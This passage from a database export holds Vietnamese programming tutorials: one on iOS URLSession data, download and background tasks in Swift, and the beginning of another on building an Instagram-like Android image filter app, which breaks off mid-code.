`URLSessionConfiguration` cũng cho phép bạn cấu hình sesstion properties như là timeout values, caching polocies và thêm headers cho HTTP. Bạn có thể vào [link này](https://developer.apple.com/reference/foundation/urlsessionconfiguration) của apple doc để có thể xem được full list configuration options.\n\n`URLSesssionTask` là một class trừu tượng (abstract class) để biểu thị cho một task object. Một session có thể tạo được một hoặc nhiều tasks để thực hiện công việc fetching data và downloading hay uploading files. Có 3 kiểu cho session task:\n* `URLSessionDataTask`: Sử dụng task này cho HTTP GET requests để nhận data từ server về.\n* `URLSessionUploadTask`: Sử dụng task này để upload file tới server, có 2 kiểu cho loại này đó là HTTP POST hoặc PUT\n* `URLSessionDownloadTask`: Sử dụng task này để download file từ server tới vị trí file tạm thời.\n![](https://images.viblo.asia/61b01279-4df7-46b9-a0d5-028e7e86ff7a.png)\nBạn có thể suspend, resume và cancel tasks. `URLSessionDownloadTask` cho phép pause và tiếp tục download.\nThông thường thì `URLSession` trả về data theo 2 hướng: một là task finishes hay là successfully hai là một error - những cái này sẽ được gọi trên methods của delegate khi mà tạo sesssion.\nTrên đây là những lý thuyết để cho bạn có cái nhìn tổng quan về `URLSession`. Bây giờ ta sẽ dựa vào những kiến thức này để lao vào giải quyết bài toán trong thực tế nhé !\n\n## Data Task\nỞ demo này thì sẽ sử dụng [iTunes Search API](https://www.apple.com/itunes/affiliates/resources/documentation/itunes-store-web-service-search-api.html) cho các request mà user search.\n\nPhần này chúng ta sẽ tạo một data task để query phục vụ cho việc khi user search.\nCác bạn mở SearchViewController + SearchBarDelegate thì `searchBarSearchButtonClicked(_:)` bắt sự kiện khi người dùng search. Ta sẽ thực hiện gọi query server tại đây - nó sẽ gọi vào `getSearchResults(searchTerm:completion:)` \nClass quản lý cho việc query service này là `QueryService`.\nTrong `QueryService.swift` chúng ta khởi tạo một `URLSession` và một `URLSessionDataTask`\n\n```\n// 1\nlet defaultSession = URLSession(configuration: .default)\n// 2\nvar dataTask: URLSessionDataTask?\n```\n\nỞ đây thì URLSessionDataTask có kiểu `.default` và một biến URLSessionDataTask để bạn sẽ tạo một GET request iTunes Search web service khi user xác nhận search. Cái thằng `dataTask` này nó sẽ khởi tạo lại mỗi lần mà user enters một new search.\n\nTiếp tục trong class `QueryService` với method `getSearchResults(searchTerm: String, completion: @escaping QueryResult)` - method này sẽ phục vụ việc GET data từ server về với đầu vào là `searchTerm` và có một closure để hứng result khi completion. Ta sẽ implementation cho method này:\n```\nfunc getSearchResults(searchTerm: String, completion: @escaping QueryResult) {\n  // 1\n  dataTask?.cancel()\n  // 2\n  if var urlComponents = URLComponents(string: "https://itunes.apple.com/search") {\n    urlComponents.query = "media=music&entity=song&term=\\(searchTerm)"\n    // 3\n    guard let url = urlComponents.url else { return }\n    // 4\n    dataTask = defaultSession.dataTask(with: url) { data, response, error in\n      defer { self.dataTask = nil }\n      // 5\n      if let error = error {\n        self.errorMessage += "DataTask error: " + error.localizedDescription + "\\n"\n      } else if let data = data,\n        let response = response as? HTTPURLResponse,\n        response.statusCode == 200 {\n        self.updateSearchResults(data)\n        // 6\n        DispatchQueue.main.async {\n          completion(self.tracks, self.errorMessage)\n        }\n      }\n    }\n    // 7\n    dataTask?.resume()\n  }\n}\n\n```\n1. Với mỗi query mới thì ta sẽ cancel data task để reuse lại data task cho việc thực hiện new query.\n2. Tạo một `URLComponents` với đầu vào là base URL và sau đó thực hiện query cho URLComponents đó.\n3. Optional-bind url property of `urlComponents` to `url`\n4. Gán data task với một URLSessionDataTask có query `url` và một completion closure handler khi mà data task completes.\n5. Nếu HTTP request successful, thì sẽ call method `updateSearchResults` với đầu vào là một response `data`\n6. Cập nhật lại data cho mảng tracks\n7. Call `resume()` để starts data task\n\nBuild và run lại rồi thử search và bạn sẽ nhìn thấy tableView đã có dữ liệu rồi.\n![](https://images.viblo.asia/f99fb745-0e68-4895-ae12-c1e154a0a502.png)\nNhư vậy `URLSession` đã được thêm vào rồi. App demo đã thêm được chức năng search tên bài hát rồi.\nTiếp tục ta sẽ làm việc với `Download Task` để có thể tap vào bài hát đó và download nó về và dễ dàng lưu trữ nó lên local file.\n## Welcome to DownloadTask\nĐể dễ dàng cho việc quản lý cũng như clear thì ta sẽ tạo thêm một class Download để có thể dễ dàng handle multiple downloads.\n![](https://images.viblo.asia/8cf8988f-06dd-422f-97c1-48be27866c9b.png)\n```\nclass Download {\n\n  var track: Track\n  init(track: Track) {\n    self.track = track\n  }\n\n  // Download service sets these values:\n  var task: URLSessionDownloadTask?\n  var isDownloading = false\n  var resumeData: Data?\n\n  // Download delegate sets this value:\n  var progress: Float = 0\n\n}\n```\n\n* Ở trên đây thì class này sẽ có một property là track với kiểu `Track`. url property of track chính là một identifier cho một `Donwload`\n* task: là `URLSessionDownloadTask`để download track\n* isDownloading: trạng thái cho việc download \n* resumeData: lưu trữ `Data` khi người sử dụng pause một download task.\n* progress: tiến độ cho việc download: từ 0.0 tới 1.0\n\nTiếp theo trong class DownloadService.swift ta sẽ add thêm property `activeDownloads`\n```\nvar activeDownloads: [URL: Download] = [:]\n\n```\nCái này phục vụ cho việc mapping giữa URL và Download.\n\n## URLSessionDownloadDelegate\nVới việc tạo download task thì bạn có thể tạo một completion handles giống như data task bạn vừa tạo ở trên. Nhưng trong demo này ta sẽ implementation cho việc update và display download progress cho việc download bài hát đó nên ta sẽ cần implement một custom delegate - cái này sẽ phục vụ rất tốt cho yêu cầu trên.\nTa có một vài sesion delegate protocols, bạn có thể tham khảo thêm ở [apple doc](https://developer.apple.com/reference/foundation/urlsession)\nImplementation thôi nào! Chúng ta sẽ vào `SearchViewController.swift` rồi add thêm extension cho nó.\n```\nextension SearchViewController: URLSessionDownloadDelegate {\n  func urlSession(_ session: URLSession, downloadTask: URLSessionDownloadTask, \n    didFinishDownloadingTo location: URL) { \n    print("Finished downloading to \\(location).")\n  }\n}\n```\n\nỞ đây thì method này handle cho việc donwload finish.\n## Creating a Download Task\n\nTrong class SearchViewController ta sẽ khởi tạo một `URLSession` để phục vụ cho việc download task. \n```\nlazy var downloadsSession: URLSession = {\n  let configuration = URLSessionConfiguration.default\n  return URLSession(configuration: configuration, delegate: self, delegateQueue: nil)\n}()\n\n```\nĐây ta khởi tại `URLSessionConfiguration` với kiểu là default. setting delegateQueue là nil bởi vì session được tạo là một serial operation queue để cho phép tất cả các delegate methods và completion handlers được gọi. Và có một chú ý đó là `downloadSession` là lazy cho phép bạn delay lại init parametter này sau khi view controller được inited.\nTiếp theo ta thêm đoạn mã này trong hàm viewDidload():\n```\ndownloadService.downloadsSession = downloadsSession\n```\nNhư vậy ta đã có session và delegate configured. Tiếp theo ta sẽ tạo một download task khi user request một track download.\n\nTrong DownloadService.swift ta sẽ implementation trong method `startDownload(_ track: Track)` như sau:\n```\nfunc startDownload(_ track: Track) {\n  // 1\n  let download = Download(track: track)\n  // 2\n  download.task = downloadsSession.downloadTask(with: track.previewURL)\n  // 3\n  download.task!.resume()\n  // 4\n  download.isDownloading = true\n  // 5\n  activeDownloads[download.track.previewURL] = download\n}\n\n```\n1. Khởi tạo một Download với track\n2. Sử dụng một URLSession mới và tạo một downloadTask với previewURL sau đó gán nó với task của Download\n3. Bắt đầu download bằng cách gọi resume()\n4. Update trạng thái là downloading\n5. Maping download url trong activeDownloads dictionary\n\n\nBuild và run và thử tap vào download thì sau một lúc bạn sẽ nhìn thấy message trong debug console là `Finished downloading`.\n![](https://images.viblo.asia/8cca35ef-a7e3-4947-a2b4-155745c2015a.png)\n Tiếp theo ta sẽ play và save nó lại nhé.\n## Saving and Playing the Track\n`urlSession(_:downloadTask:didFinishDownloadingTo:)` chính thằng này sẽ cung cấp cho ta temporary file location sau khi download finish. Nhiệm vụ của ta là sẽ di chuyển nó tới nơi cần trước khi nó được trả ra từ method này\nTa sẽ implementation lại method này như sau:\n```\n// 1\nguard let sourceURL = downloadTask.originalRequest?.url else { return }\nlet download = downloadService.activeDownloads[sourceURL]\ndownloadService.activeDownloads[sourceURL] = nil\n// 2\nlet destinationURL = localFilePath(for: sourceURL)\nprint(destinationURL)\n// 3\nlet fileManager = FileManager.default\ntry? fileManager.removeItem(at: destinationURL)\ndo {\n  try fileManager.copyItem(at: location, to: destinationURL)\n  download?.track.downloaded = true\n} catch let error {\n  print("Could not copy file to disk: \\(error.localizedDescription)")\n}\n// 4\nif let index = download?.track.index {\n  DispatchQueue.main.async {\n    self.tableView.reloadRows(at: [IndexPath(row: index, section: 0)], with: .none)\n  }\n}\n```\nBuild và run project. Sau khi download xong thì bạn sẽ nhìn thấy path location ở console. Như của mình thì nó sẽ như thế này:\n```\nfile:///Users/macbook/Library/Developer/CoreSimulator/Devices/F712430D-AA5E-4371-9D62-9277D6A99CCD/data/Containers/Data/Application/8EFB5994-7060-40EB-B464-5356555562C5/Documents/mzaf_15004041856361393205.plus.aac.p.m4a\n```\n\nSau khi finish download then button download disappear because `download?.track.downloaded = true`. Tiếp tục tap vào cell thì bạn sẽ thấy trình AVPlayerViewController hiện thị lên như dưới đây:\n![](https://images.viblo.asia/ad4193cd-e15e-4266-8b02-0edc6443ecc4.png)\n\n## Pausing, Resuming and Cancelling Downloads\nTiếp theo ta sẽ implementation cho việc pause, cancel, resume a download.\nTrong class DownloadService ta sẽ implementation method cancelDownload(_:) \n```\nfunc cancelDownload(_ track: Track) {\n  if let download = activeDownloads[track.previewURL] {\n    download.task?.cancel()\n    activeDownloads[track.previewURL] = nil\n  }\n}\n```\nTiếp theo là `pauseDownload(_:)`:\n```\nfunc pauseDownload(_ track: Track) {\n  guard let download = activeDownloads[track.previewURL] else { return }\n  if download.isDownloading {\n    download.task?.cancel(byProducingResumeData: { data in\n      download.resumeData = data\n    })\n    download.isDownloading = false\n  }\n}\n```\n\nCó một điều khác nhau ở 2 method trên! Không biết các bạn có nhận ra không =)) Đó chính là `cancel(byProducingResumeData:)` thay vì `cancel()`. Trong đó bạn cung cấp một closure parameter cái mà bạn sẽ lưu lại resume data để phục vụ cho việc resume tiếp.\nBạn cũng set `download.isDownloading = false` nhằm để biểu thị là download is pause.\nTiếp theo đó là mothod `resumeDownload(_ track: Track)` như sau:\n```\nfunc resumeDownload(_ track: Track) {\n  guard let download = activeDownloads[track.previewURL] else { return }\n  if let resumeData = download.resumeData {\n    download.task = downloadsSession.downloadTask(withResumeData: resumeData)\n  } else {\n    download.task = downloadsSession.downloadTask(with: download.track.previewURL)\n  }\n  download.task!.resume()\n  download.isDownloading = true\n}\n```\nỞ đây thì mình sẽ check nếu download đó tồn tại resumeData thì tiếp tục download với resumeData đó còn nếu chưa thì sẽ khởi tạo session mới với đầu vào là previewURL cho downloadSession đó.\nVà cuối cùng nhớ set cờ isDownloading là true nhé `download.isDownloading = true`\n\nVề mặt UI cho cell để trực quan hoá các trạng thái download thì ta sẽ implementation thêm cho TrackCell.swift \nTa sẽ sửa lại một chúe cho hàm configure trong TrackCell.swift thành:\n`func configure(track: Track, downloaded: Bool, download: Download?) {`\nvà đồng nghĩa trong SearchViewController sẽ fix lại trong tableView(_:cellForRowAt)\n`cell.configure(track: track, downloaded: track.downloaded, \n  download: downloadService.activeDownloads[track.previewURL])`\n\n Tiếp tục ta sẽ thêm trong hàm configure như sau:\n\n ```\n var showDownloadControls = false\n ```\n\n```\ndownloadButton.isHidden = downloaded || showDownloadControls\n```\n\nBuild và run. Download một vài track và bạn có thể pause, resume và cancel\n\n![](https://images.viblo.asia/ca800170-fff0-4dcb-a701-9881dbf1d86f.png)\n\nTiếp theo ta sẽ hiện thị ra download progress cho bài đang được download.\n\n## Showing Download Progress\nĐầu tiên ta sẽ implement progress trong TrackCell.swift \n```\nfunc updateDisplay(progress: Float, totalSize : String) {\n  progressView.progress = progress\n  progressLabel.text = String(format: "%.1f%% of %@", progress * 100, totalSize)\n}\n```\nDelegate method sẽ call phương thức này để set value cho progress.\nĐể gọi delegate method đó ra ta sẽ qua SearchVC+URLSessionDelegates.swift và add `URLSessionDownloadDelegate` extension.\n```\nfunc urlSession(_ session: URLSession, downloadTask: URLSessionDownloadTask, \n  didWriteData bytesWritten: Int64, totalBytesWritten: Int64, \n  totalBytesExpectedToWrite: Int64) {\n  // 1\n  guard let url = downloadTask.originalRequest?.url,\n    let download = downloadService.activeDownloads[url]  else { return }\n  // 2\n  download.progress = Float(totalBytesWritten) / Float(totalBytesExpectedToWrite)\n  // 3\n  let totalSize = ByteCountFormatter.string(fromByteCount: totalBytesExpectedToWrite, countStyle: .file)\n  // 4\n    DispatchQueue.main.async {\n    if let trackCell = self.tableView.cellForRow(at: IndexPath(row: download.track.index,\n      section: 0)) as? TrackCell {\n      trackCell.updateDisplay(progress: download.progress, totalSize: totalSize)\n    }\n  }\n}\n```\nỞ trong method này thì nó đã cung cấp `totalBytesWritten` và `totalBytesExpectedToWrite` thì ta sẽ dựa vào đây để tính ra được progress.\nBuild và run project thì ta sẽ được như sau:\n![](https://images.viblo.asia/b2701eb1-1a06-4476-941d-a5ddf51ee38a.png)\n\nỞ trên thì ta đang download với trong khi app đang ở trạng thái hoạt động, bây giờ ta sẽ tranfer cho app có thể download khi đang ở background.\n## Enabling Background Transfers\nMờ file SearchViewController.swift thay vì sử dụng default session configuration, ta sẽ đổi qua background session configuration.\nĐể handle task completes khi app không running thì bạn cần handle event đó từ app delegate.\n```\nfunc application(_ application: UIApplication, handleEventsForBackgroundURLSession \n  identifier: String, completionHandler: @escaping () -> Void) {\n  backgroundSessionCompletionHandler = completionHandler\n}\n\n```\n\nVà \n\n```\nextension SearchViewController: URLSessionDelegate {\n\n  // Standard background session handler\n  func urlSessionDidFinishEvents(forBackgroundURLSession session: URLSession) {\n    DispatchQueue.main.async {\n      if let appDelegate = UIApplication.shared.delegate as? AppDelegate,\n        let completionHandler = appDelegate.backgroundSessionCompletionHandler {\n        appDelegate.backgroundSessionCompletionHandler = nil\n        completionHandler()\n      }\n    }\n  }\n\n}\n```\n\nDONE! Build và run rồi cảm nhận nhé các bạn\n\n# Tổng kết:\nCảm ơn mọi người đã theo dõi và đọc bài viết này. Như vậy mình đã giới thiệu tổng quan về URLSession chính và chủ yếu của nó thông qua ví dụ rất trực quan. \n\n# Tham khảo:\n- Bài viết tham khảo từ [raywenderlich](https://www.raywenderlich.com/567-urlsession-tutorial-getting-started)\n- https://developer.apple.com/documentation/	Giới thiệu\nTrong bài viết này mình xin chia sẻ tất tần tật về URLSession, cách tạo HTTP requests cũng như implement background download rằng có thể vừa paused vừa resumed.\nMột ứng dụng cơ bản cần có các chức năng có thể get để lấy dữ liệu từ server, update các trạng thái hay download remote file tới bộ nhớ. Để phục vụ cho anh em những thứ trên thì Apple đã cung cấp URLSession - là một networkin...	{https://images.viblo.asia/195a80d0-d94a-43ec-b368-ced52ffff8b6.png,https://images.viblo.asia/443eaf0c-96f3-48f6-a217-d424e93a9de7.png,https://images.viblo.asia/61b01279-4df7-46b9-a0d5-028e7e86ff7a.png,https://images.viblo.asia/f99fb745-0e68-4895-ae12-c1e154a0a502.png,https://images.viblo.asia/8cf8988f-06dd-422f-97c1-48be27866c9b.png,https://images.viblo.asia/8cca35ef-a7e3-4947-a2b4-155745c2015a.png,https://images.viblo.asia/ad4193cd-e15e-4266-8b02-0edc6443ecc4.png,https://images.viblo.asia/ca800170-fff0-4dcb-a701-9881dbf1d86f.png,https://images.viblo.asia/b2701eb1-1a06-4476-941d-a5ddf51ee38a.png}	1	URLSession chưa bao giờ dễ dàng đến vậy !	{swift,ios}	0	f	2022-12-18 15:33:38.093+00	2022-12-18 15:33:38.093+00
31981	Ngày nay các bộ lọc hình ảnh khá phổ biến trong nhiều ứng dụng Android. Instagram nổi tiếng với tính năng bộ lọc phổ biến và có lẽ là ứng dụng đầu tiên giới thiệu bộ lọc hình ảnh cho thế giới Android. \nCó rất nhiều ứng dụng chỉnh sửa hình ảnh khác cung cấp các bộ lọc hình ảnh và các tính năng chỉnh sửa hình ảnh.\n\nTrong bài viết này, chúng ta sẽ tìm hiểu cách xây dựng một ứng dụng bộ lọc hình ảnh như Instagram. \nChúng ta không phát triển chính xác các bộ lọc hình ảnh trong Instagram mà chúng ta sẽ sử dụng các bộ lọc ma fthuw viện cung cấp.\n\n## 1. Bộ lọc hình ảnh được xây dựng như thế nào\n\nThông thường các thao tác xử lý ảnh sẽ được thực hiện bằng ngôn ngữ native C / C ++ bản địa. \nTrong Android, bạn có thể viết thư viện của mình bằng C hoặc C ++ và sử dụng **JNI** (Java Native Interface) để làm cho các hàm có thể truy cập thông qua code java. \nBạn cũng có thể xem xét sử dụng các thư viện xử lý ảnh phổ biến như [openCV](https://opencv.org/) để tạo thư viện bộ lọc của riêng bạn.\n\nChúng tã sẽ sử dụng thư viện bộ lọc hình ảnh hiện có trong bài viết này.\n\n## 2. Sử dụng thư viện AndroidPhotoFilters\n\nTrong bài viết này, chúng ta sẽ sử dụng thư viện bộ lọc hình ảnh [AndroidPhotoFilters](https://github.com/Zomato/AndroidPhotoFilters) được phát triển bởi Zomato. \nThư viện này cung cấp các thao tác chỉnh sửa hình ảnh cơ bản như kiểm soát Độ sáng, Độ bão hòa, Độ tương phản và một vài bộ lọc hình ảnh. \n\nKết hợp tất cả các tính năng này với nhau, bạn có thể tạo ra một app chỉnh sửa hình ảnh cơ bản.\n\nCũng cần nhớ rằng thư viện rất cơ bản, bạn không thể đạt được các bộ lọc tuyệt vời như Instagram bằng cách này. \nĐể xây dựng bộ lọc chính xác như Instagram, rất nhiều code Native C/C++ phải được thực hiện.\n\nNhưng chúng ta sẽ cố gắng đạt được các bộ lọc giống như Instagram.\n\nSử dụng thư viện như sau :\n\n```\ndependencies {\n    implementation fileTree(dir: 'libs', include: ['*.jar'])\n    // ...\n \n    implementation 'info.androidhive:imagefilters:1.0.7'\n}\n```\n\n## 3. Xây dựng ứng dụng\n\n![](https://images.viblo.asia/a7208cad-de81-41d9-9420-3bc0c448a67b.png)\n\n1. Tạo project mới **File ⇒ New Project => Basic Activity**\n2. Sử dụng các thư viện cần thiết sau trong app/build.gradle :\n\n```\ndependencies {\n    // ...\n \n    // image filters\n    implementation 'info.androidhive:imagefilters:1.0.7'\n \n    // butter knife\n    compile 'com.jakewharton:butterknife:8.8.1'\n    annotationProcessor 'com.jakewharton:butterknife-compiler:8.8.1'\n \n    // dexter M permissions\n    compile 'com.karumi:dexter:4.1.0'\n \n    compile 'com.android.support:recyclerview-v7:26.1.0'\n}\n```\n\n3. Thêm các resource trong **strings.xml**, **colors.xml**, **dimens.xml**, **styles.xml** :\n\n```\n<resources>\n    <string name="app_name">Image Filters</string>\n    <string name="activity_title_main">Filters</string>\n    <string name="action_settings">Settings</string>\n    <string name="filters">FILTERS</string>\n    <string name="edit">EDIT</string>\n \n    <string name="lbl_brightness">BRIGHTNESS</string>\n    <string name="lbl_contrast">CONTRAST</string>\n    <string name="lbl_saturation">SATURATION</string>\n    <string name="tab_filters">FILTERS</string>\n    <string name="tab_edit">EDIT</string>\n \n \n    <string name="roboto_medium">sans-serif-medium</string>\n    <string name="filter_normal">Normal</string>\n    <string name="action_save">SAVE</string>\n    <string name="action_open">OPEN</string>\n</resources>\n```\n\n```\n<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <color name="colorPrimary">#3F51B5</color>\n    <color name="colorPrimaryDark">#303F9F</color>\n    <color name="colorAccent">#009688</color>\n    <color name="color_option_menu">#FF3990</color>\n    <color name="filter_label_normal">#8A8889</color>\n    <color name="filter_label_selected">#221F20</color>\n</resources>\n```\n\n```\ndimens.xml\n<resources>\n    <dimen name="fab_margin">16dp</dimen>\n    <dimen name="thumbnail_size">80dp</dimen>\n    <dimen name="recycler_size">100dp</dimen>\n    <dimen name="thumbnail_horizontal_padding">8dp</dimen>\n    <dimen name="thumbnail_vertical_padding">10dp</dimen>\n    <dimen name="padding_10">10dp</dimen>\n    <dimen name="margin_horizontal">16dp</dimen>\n    <dimen name="lbl_edit_image_control">100dp</dimen>\n</resources>\n```\n\n```\n<resources>\n \n    <!-- Base application theme. -->\n    <style name="AppTheme" parent="Theme.AppCompat.Light">\n        <!-- Customize your theme here. -->\n        <item name="colorPrimary">@color/colorPrimary</item>\n        <item name="colorPrimaryDark">@color/colorPrimaryDark</item>\n        <item name="colorAccent">@color/colorAccent</item>\n    </style>\n \n    <style name="AppTheme.NoActionBar">\n        <item name="windowActionBar">false</item>\n        <item name="windowNoTitle">true</item>\n    </style>\n \n    <style name="AppTheme.NoActionBar.Fullscreen">\n        <item name="windowActionBar">false</item>\n        <item name="windowNoTitle">true</item>\n        <item name="android:windowFullscreen">true</item>\n        <item name="android:actionMenuTextColor">@color/color_option_menu</item>\n    </style>\n \n    <style name="AppTheme.AppBarOverlay" parent="ThemeOverlay.AppCompat.Light" />\n \n    <style name="AppTheme.PopupOverlay" parent="ThemeOverlay.AppCompat.Light" />\n \n</resources>\n```\n\n4. Thêm các Permission sau :\n\n```\n<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android"\n    package="info.androidhive.imagefilters">\n \n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\n \n    <application\n        android:allowBackup="true"\n        android:icon="@mipmap/ic_launcher"\n        android:label="@string/app_name"\n        android:roundIcon="@mipmap/ic_launcher_round"\n        android:supportsRtl="true"\n        android:theme="@style/AppTheme">\n        <activity\n            android:name=".MainActivity"\n            android:label="@string/app_name"\n            android:theme="@style/AppTheme.NoActionBar.Fullscreen">\n            <intent-filter>\n                <action android:name="android.intent.action.MAIN" />\n \n                <category android:name="android.intent.category.LAUNCHER" />\n            </intent-filter>\n        </activity>\n    </application>\n \n</manifest>\n```\n\n5. Thêm **menu res => menu => menu_main.xml** :\n\n```\n<menu xmlns:android="http://schemas.android.com/apk/res/android"\n    xmlns:app="http://schemas.android.com/apk/res-auto"\n    xmlns:tools="http://schemas.android.com/tools"\n    tools:context="info.androidhive.imagefilters.MainActivity">\n    <item\n        android:id="@+id/action_open"\n        android:orderInCategory="100"\n        android:title="@string/action_open"\n        app:showAsAction="always" />\n \n    <item\n        android:id="@+id/action_save"\n        android:orderInCategory="101"\n        android:title="@string/action_save"\n        app:showAsAction="always" />\n</menu>\n```\n\n6. Tạo package uitls => BitmapUtils.java :\n\n```\nimport android.content.ContentResolver;\nimport android.content.ContentUris;\nimport android.content.ContentValues;\nimport android.content.Context;\nimport android.content.res.AssetManager;\nimport android.content.res.Resources;\nimport android.database.Cursor;\nimport android.graphics.Bitmap;\nimport android.graphics.BitmapFactory;\nimport android.graphics.Matrix;\nimport android.net.Uri;\nimport android.provider.MediaStore;\nimport android.util.Log;\n \nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n \n/**\n * Created by ravi on 06/11/17.\n */\n \npublic class BitmapUtils {\n \n    private static final String TAG = BitmapUtils.class.getSimpleName();\n \n    /**\n     * Getting bitmap from Assets folder\n     *\n     * @return\n     */\n    public static Bitmap getBitmapFromAssets(Context context, String fileName, int width, int height) {\n        AssetManager assetManager = context.getAssets();\n \n        InputStream istr;\n        Bitmap bitmap = null;\n        try {\n            final BitmapFactory.Options options = new BitmapFactory.Options();\n            options.inJustDecodeBounds = true;\n \n            istr = assetManager.open(fileName);\n \n            // Calculate inSampleSize\n            options.inSampleSize = calculateInSampleSize(options, width, height);\n \n            // Decode bitmap with inSampleSize set\n            options.inJustDecodeBounds = false;\n            return BitmapFactory.decodeStream(istr, null, options);\n        } catch (IOException e) {\n            Log.e(TAG, "Exception: " + e.getMessage());\n        }\n \n        return null;\n    }\n \n    /**\n     * Getting bitmap from Gallery\n     *\n     * @return\n     */\n    public static Bitmap getBitmapFromGallery(Context context, Uri path, int width, int height) {\n        String[] filePathColumn = {MediaStore.Images.Media.DATA};\n        Cursor cursor = context.getContentResolver().query(path, filePathColumn, null, null, null);\n        cursor.moveToFirst();\n        int columnIndex = cursor.getColumnIndex(filePathColumn[0]);\n        String picturePath = cursor.getString(columnIndex);\n        cursor.close();\n \n        final BitmapFactory.Options options = new BitmapFactory.Options();\n        options.inJustDecodeBounds = true;\n        BitmapFactory.decodeFile(picturePath, options);\n \n        // Calculate inSampleSize\n        options.inSampleSize = calculateInSampleSize(options, width, height);\n \n        // Decode bitmap with inSampleSize set\n        options.inJustDecodeBounds = false;\n        return BitmapFactory.decodeFile(picturePath, options);\n    }\n \n    private static int calculateInSampleSize(\n            BitmapFactory.Options options, int reqWidth, int reqHeight) {\n        // Raw height and width of image\n        final int height = options.outHeight;\n        final int width = options.outWidth;\n        int inSampleSize = 1;\n \n        if (height > reqHeight || width > reqWidth) {\n \n            final int halfHeight = height / 2;\n            final int halfWidth = width / 2;\n \n            // Calculate the largest inSampleSize value that is a power of 2 and keeps both\n            // height and width larger than the requested height and width.\n            while ((halfHeight / inSampleSize) >= reqHeight\n                    && (halfWidth / inSampleSize) >= reqWidth) {\n                inSampleSize *= 2;\n            }\n        }\n \n        return inSampleSize;\n    }\n \n    public static Bitmap decodeSampledBitmapFromResource(Resources res, int resId,\n                                                         int reqWidth, int reqHeight) {\n \n        // First decode with inJustDecodeBounds=true to check dimensions\n        final BitmapFactory.Options options = new BitmapFactory.Options();\n        options.inJustDecodeBounds = true;\n        BitmapFactory.decodeResource(res, resId, options);\n \n        // Calculate inSampleSize\n        options.inSampleSize = calculateInSampleSize(options, reqWidth, reqHeight);\n \n        // Decode bitmap with inSampleSize set\n        options.inJustDecodeBounds = false;\n        return BitmapFactory.decodeResource(res, resId, options);\n    }\n \n    /**\n     * Storing image to device gallery\n     * @param cr\n     * @param source\n     * @param title\n     * @param description\n     * @return\n     */\n    public static final String insertImage(ContentResolver cr,\n                                           Bitmap source,\n                                           String title,\n                                           String description) {\n \n        ContentValues values = new ContentValues();\n        values.put(MediaStore.Images.Media.TITLE, title);\n        values.put(MediaStore.Images.Media.DISPLAY_NAME, title);\n        values.put(MediaStore.Images.Media.DESCRIPTION, description);\n        values.put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg");\n        // Add the date meta data to ensure the image is added at the front of the gallery\n        values.put(MediaStore.Images.Media.DATE_ADDED, System.currentTimeMillis());\n        values.put(MediaStore.Images.Media.DATE_TAKEN, System.currentTimeMillis());\n \n        Uri url = null;\n        String stringUrl = null;    /* value to be returned */\n \n        try {\n            url = cr.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);\n \n            if (source != null) {\n                OutputStream imageOut = cr.openOutputStream(url);\n                try {\n                    source.compress(Bitmap.CompressFormat.JPEG, 50, imageOut);\n                } finally {\n                    imageOut.close();\n                }\n \n                long id = ContentUris.parseId(url);\n                // Wait until MINI_KIND thumbnail is generated.\n                Bitmap miniThumb = MediaStore.Images.Thumbnails.getThumbnail(cr, id, MediaStore.Images.Thumbnails.MINI_KIND, null);\n                // This is for backward compatibility.\n                storeThumbnail(cr, miniThumb, id, 50F, 50F, MediaStore.Images.Thumbnails.MICRO_KIND);\n            } else {\n                cr.delete(url, null, null);\n                url = null;\n            }\n        } catch (Exception e) {\n            if (url != null) {\n                cr.delete(url, null, null);\n                url = null;\n            }\n        }\n \n        if (url != null) {\n            stringUrl = url.toString();\n        }\n \n        return stringUrl;\n    }\n \n    /**\n     * A copy of the Android internals StoreThumbnail method, it used with the insertImage to\n     * populate the android.provider.MediaStore.Images.Media#insertImage with all the correct\n     * meta data. The StoreThumbnail method is private so it must be duplicated here.\n     *\n     * @see android.provider.MediaStore.Images.Media (StoreThumbnail private method)\n     */\n    private static final Bitmap storeThumbnail(\n            ContentResolver cr,\n            Bitmap source,\n            long id,\n            float width,\n            float height,\n            int kind) {\n \n        // create the matrix to scale it\n        Matrix matrix = new Matrix();\n \n        float scaleX = width / source.getWidth();\n        float scaleY = height / source.getHeight();\n \n        matrix.setScale(scaleX, scaleY);\n \n        Bitmap thumb = Bitmap.createBitmap(source, 0, 0,\n                source.getWidth(),\n                source.getHeight(), matrix,\n                true\n        );\n \n        ContentValues values = new ContentValues(4);\n        values.put(MediaStore.Images.Thumbnails.KIND, kind);\n        values.put(MediaStore.Images.Thumbnails.IMAGE_ID, (int) id);\n        values.put(MediaStore.Images.Thumbnails.HEIGHT, thumb.getHeight());\n        values.put(MediaStore.Images.Thumbnails.WIDTH, thumb.getWidth());\n \n        Uri url = cr.insert(MediaStore.Images.Thumbnails.EXTERNAL_CONTENT_URI, values);\n \n        try {\n            OutputStream thumbOut = cr.openOutputStream(url);\n            thumb.compress(Bitmap.CompressFormat.JPEG, 100, thumbOut);\n            thumbOut.close();\n            return thumb;\n        } catch (FileNotFoundException ex) {\n            return null;\n        } catch (IOException ex) {\n            return null;\n        }\n    }\n}\n```\n\nTrong pạkeage utiles , tạo **NonSwipeableViewPager.java **\n\n```\nimport android.content.Context;\nimport android.support.v4.view.ViewPager;\nimport android.util.AttributeSet;\nimport android.view.MotionEvent;\nimport android.view.animation.DecelerateInterpolator;\nimport android.widget.Scroller;\n \nimport java.lang.reflect.Field;\n \n/**\n * Created by ravi on 24/10/17.\n * Custom viewpager disabling the swipe\n * https://stackoverflow.com/questions/9650265/how-do-disable-paging-by-swiping-with-finger-in-viewpager-but-still-be-able-to-s\n */\n \npublic class NonSwipeableViewPager extends ViewPager {\n \n    public NonSwipeableViewPager(Context context) {\n        super(context);\n        setMyScroller();\n    }\n \n    public NonSwipeableViewPager(Context context, AttributeSet attrs) {\n        super(context, attrs);\n        setMyScroller();\n    }\n \n    @Override\n    public boolean onInterceptTouchEvent(MotionEvent event) {\n        // Never allow swiping to switch between pages\n        return false;\n    }\n \n    @Override\n    public boolean onTouchEvent(MotionEvent event) {\n        // Never allow swiping to switch between pages\n        return false;\n    }\n \n    //down one is added for smooth 